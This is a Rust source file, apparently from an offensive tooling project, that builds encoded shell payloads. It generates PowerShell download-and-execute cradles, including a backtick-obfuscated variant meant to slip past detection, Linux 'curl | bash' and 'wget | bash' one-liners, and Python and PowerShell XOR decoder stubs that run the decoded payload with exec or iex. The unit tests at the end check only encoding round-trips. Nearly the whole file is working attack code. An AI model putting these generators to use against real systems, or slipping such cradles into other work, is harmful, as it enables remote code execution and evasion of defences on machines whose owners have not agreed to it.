// Payload Encoders
// Encoding and obfuscation utilities for shell payloads

#![allow(dead_code)]

use base64::{engine::general_purpose::STANDARD, Engine};

/// XOR encode a string with a key
pub fn xor_encode(data: &str, key: &str) -> String {
    let key_bytes: Vec<u8> = key.bytes().collect();
    let encoded: Vec<u8> = data
        .bytes()
        .enumerate()
        .map(|(i, b)| b ^ key_bytes[i % key_bytes.len()])
        .collect();

    // Return as hex string for easy transport
    hex::encode(encoded)
}

/// XOR decode a hex string with a key
pub fn xor_decode(hex_data: &str, key: &str) -> Result<String, hex::FromHexError> {
    let encoded = hex::decode(hex_data)?;
    let key_bytes: Vec<u8> = key.bytes().collect();
    let decoded: Vec<u8> = encoded
        .iter()
        .enumerate()
        .map(|(i, b)| b ^ key_bytes[i % key_bytes.len()])
        .collect();

    Ok(String::from_utf8_lossy(&decoded).to_string())
}

/// Base64 encode
pub fn base64_encode(data: &str) -> String {
    STANDARD.encode(data)
}

/// Base64 decode
pub fn base64_decode(data: &str) -> Result<String, base64::DecodeError> {
    let decoded = STANDARD.decode(data)?;
    Ok(String::from_utf8_lossy(&decoded).to_string())
}

/// Generate a PowerShell download and execute cradle
pub fn powershell_download_cradle(url: &str) -> String {
    format!(
        r#"IEX(New-Object Net.WebClient).DownloadString('{}')"#,
        url
    )
}

/// Generate a PowerShell download and execute cradle (obfuscated)
pub fn powershell_download_cradle_obfuscated(url: &str) -> String {
    format!(
        r#"$w=(N`ew-Ob`ject N`et.We`bCl`ient);$w.Do`wnl`oadS`tri`ng('{}')|ie`x"#,
        url
    )
}

/// Generate a curl download and execute for Linux
pub fn linux_download_cradle(url: &str) -> String {
    format!(r#"curl -s {} | bash"#, url)
}

/// Generate a wget download and execute for Linux
pub fn linux_wget_cradle(url: &str) -> String {
    format!(r#"wget -q -O - {} | bash"#, url)
}

/// Generate Python decoder stub for XOR payload
pub fn python_xor_decoder(hex_payload: &str, key: &str) -> String {
    format!(
        r#"import binascii
key = '{}'
payload = binascii.unhexlify('{}')
decoded = ''.join(chr(b ^ ord(key[i % len(key)])) for i, b in enumerate(payload))
exec(decoded)"#,
        key, hex_payload
    )
}

/// Generate PowerShell decoder stub for XOR payload
pub fn powershell_xor_decoder(hex_payload: &str, key: &str) -> String {
    format!(
        r#"$k="{}";$p="{}";$b=[byte[]]::new($p.Length/2);for($i=0;$i-lt$b.Length;$i++){{$b[$i]=[Convert]::ToByte($p.Substring($i*2,2),16)-bxor$k[$i%$k.Length]}};iex([System.Text.Encoding]::ASCII.GetString($b))"#,
        key, hex_payload
    )
}

/// Generate a random alphanumeric key
pub fn generate_random_key(length: usize) -> String {
    use rand::Rng;
    const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let mut rng = rand::thread_rng();
    (0..length)
        .map(|_| {
            let idx = rng.gen_range(0..CHARSET.len());
            CHARSET[idx] as char
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xor_encode_decode() {
        let original = "Hello, World!";
        let key = "secret";

        let encoded = xor_encode(original, key);
        let decoded = xor_decode(&encoded, key).unwrap();

        assert_eq!(original, decoded);
    }

    #[test]
    fn test_base64_encode_decode() {
        let original = "Test payload";
        let encoded = base64_encode(original);
        let decoded = base64_decode(&encoded).unwrap();

        assert_eq!(original, decoded);
    }

    #[test]
    fn test_random_key_generation() {
        let key = generate_random_key(16);
        assert_eq!(key.len(), 16);
        assert!(key.chars().all(|c| c.is_alphanumeric()));
    }
}
